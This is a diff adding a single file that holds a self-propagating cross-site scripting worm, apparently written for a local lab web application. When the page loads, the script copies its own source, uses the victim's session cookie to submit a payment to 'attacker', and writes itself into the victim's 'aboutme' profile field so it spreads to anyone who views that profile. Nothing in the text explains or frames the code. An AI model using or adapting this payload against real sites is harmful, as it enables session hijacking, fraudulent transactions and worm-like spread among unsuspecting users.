@@ -1,0 +1,26 @@
+<script id="worm">
+window.onload = function(){
+var headerTag = "<script id=\"worm\">";
+var jsCode = document.getElementById("worm").innerHTML;
+var tailTag = "</" + "script>";
+
+var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+var xhr = new XMLHttpRequest();
+xhr.open("POST", 'http://localhost:8080/pay', true);
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhr.send("recipient=attacker&amount=1&submit=Pay&session_id=" + document.cookie.split("=")[1]);
+
+ff=new XMLHttpRequest();
+var sendurl="http://localhost:8080/aboutme";
+ff.open("POST", sendurl, true);
+ff.setRequestHeader("Host","http://localhost:8080");
+ff.setRequestHeader("Keep-Alive","300");
+ff.setRequestHeader("Connection","keep-alive");
+ff.setRequestHeader("Cookie",document.cookie);
+ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+ff.setRequestHeader("Referer","http://localhost:8080/aboutme/");
+params="aboutme=".concat(wormCode);
+ff.send(params);
+}
+</script>
